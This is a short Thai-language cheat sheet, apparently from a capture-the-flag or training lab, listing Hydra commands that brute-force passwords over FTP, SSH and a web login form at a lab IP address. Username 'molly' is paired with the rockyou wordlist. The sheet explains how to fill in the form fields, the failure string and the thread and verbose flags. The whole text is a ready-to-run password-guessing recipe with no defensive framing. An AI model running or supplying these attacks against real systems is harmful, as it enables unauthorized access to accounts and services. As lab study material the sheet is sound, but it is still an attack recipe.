#web
- Bruteforce ได้ทุกอย่าง
- FTP : hydra -l `user` -P `passlist.txt` `ftp://10.10.15.171`
- SSH : hydra -l `molly` -P `rockyou.txt` `10.10.15.171` -t 4 ssh
- Website : hydra -l `molly` -P `rockyou.txt` `10.10.15.171` `http-post-form` "`/login`:`username=`^USER^&`password=`^PASS^:`F=incorrect`” -V
- /login = ตำแหน่งที่จะ bruteforce
- `username=`^USER^&`password=`^PASS^ = หาจาก bur psuit
- `F=incorrect` = ข้อความตอบกลับเวลารหัสผิด
- -l = username -P = password -t = กำหนดจำนวนเธรดที่จะสร้าง -V = แสดงรหัสที่ลองทั้งหมด